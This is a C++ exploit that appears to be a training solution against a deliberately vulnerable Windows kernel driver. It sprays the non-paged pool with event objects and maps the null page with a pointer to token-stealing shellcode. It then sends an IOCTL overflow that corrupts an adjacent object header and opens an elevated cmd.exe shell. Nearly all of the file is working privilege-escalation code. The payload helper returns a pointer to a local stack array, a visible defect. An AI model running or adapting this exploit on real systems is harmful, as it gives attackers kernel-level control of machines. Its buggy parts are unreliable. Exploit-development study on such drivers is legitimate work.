#include <Windows.h>
#include <iostream>
#include <vector>

#include "ioctal_codes.h"
#include "Solutions.h"
#include "utils.h"

#define PAYLOAD_SIZE 0x25
#define OVERFLOW_OFFSET 0x1F8
#define CLOSE_PROCEDURE_OFFSET 0x60

using namespace std;

std::vector<HANDLE> first;
std::vector<HANDLE> second;

NTSTATUS HeapSprayEventObject();
PBYTE GetNonPagedPoolOverflowPayload();
VOID CleanEventHandles();

NTSTATUS Solutions::TriggerNonPagedPoolOverflow() {
	PCHAR lpInBuffer = 0;
	DWORD dwBufLen = OVERFLOW_OFFSET + PAYLOAD_SIZE;
	DWORD dwBytesReturned = 0;

	// spray heap to allocate "Hack" object between Event objects
	HeapSprayEventObject();

	lpInBuffer = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufLen);
	if (!lpInBuffer) {
		cout << "[!] Could not allocate buffer" << endl;
		return STATUS_NO_MEMORY;
	}
	RtlFillMemory(lpInBuffer, OVERFLOW_OFFSET, 0x41);

	AllocateNullPage(0x1000);
	cout << "[+] Allocated null paged" << endl;

	// put shellcode pointer in null page + 0x60
	*(PULONG)(CLOSE_PROCEDURE_OFFSET) = (ULONG)(&tokenStealingShellcodeWriteWhatWhere);
	cout << "[+] Copied shellcode to null page: " << hex << &tokenStealingShellcodeWriteWhatWhere << endl;

	PBYTE payload = GetNonPagedPoolOverflowPayload();
	RtlCopyMemory(lpInBuffer + OVERFLOW_OFFSET, payload, PAYLOAD_SIZE);
	cout << "[+] Copied payload to buffer" << endl;

	if (!DeviceIoControl(_hDeviceHandle, IOCTL_NON_PAGED_POOL_OVERFLOW,
		lpInBuffer, dwBufLen, NULL, NULL, &dwBytesReturned, NULL)) {
		cout << "[!] Could not interact with the driver - " << GetLastError() << endl;
		return STATUS_INVALID_PARAMETER;
	}
	
	cout << "[+] Closing handles, Enjoy shell" << endl;
	CleanEventHandles();

	system("cmd.exe");

	return 0;
}

static NTSTATUS HeapSprayEventObject() {
	cout << "[+] Started derandomizing nonPagedPool" << endl;
	for (int i = 0; i < 10000; i++) {
		HANDLE tmpEvent = CreateEventA(NULL, FALSE, FALSE, "");
		first.push_back(tmpEvent);
	}

	cout << "[+] Allocating sequantial objects " << endl;
	for (int i = 0; i < 6000; i++) {
		HANDLE tmpEvent = CreateEventA(NULL, FALSE, FALSE, "");
		second.push_back(tmpEvent);
		
		if (i >= 5990) {
			cout << "[+] handle: " << hex << tmpEvent << endl;
		}
	}

	cout << "[+] Creating holes in sizes 0x200" << endl;
	for (int i = 0; i < second.size(); i+=16) {
		for (int j = 0; j < 8; j++) {
			CloseHandle(second[i + j]);
		}
	}

	return 0;
}

static PBYTE GetNonPagedPoolOverflowPayload() {
	BYTE payload[] = "\x40\x00\x08\x04" 
		"\x45\x76\x65\xee" // pool tag
		"\x00\x00\x00\x00" 
		"\x40\x00\x00\x00" 
		"\x00\x00\x00\x00" 
		"\x00\x00\x00\x00" 
		"\x01\x00\x00\x00"
		"\x01\x00\x00\x00"
		"\x00\x00\x00\x00"
		"\x00"; // overwrite array index

	return payload;
}

static VOID CleanEventHandles() {
	for(HANDLE hEvent : first) {
		CloseHandle(hEvent);
	}

	for (int i = 8; i < second.size(); i+=16) {
		for (int j = 0; j < 8; j++) {
			CloseHandle(second[i + j]);
		}
	}
}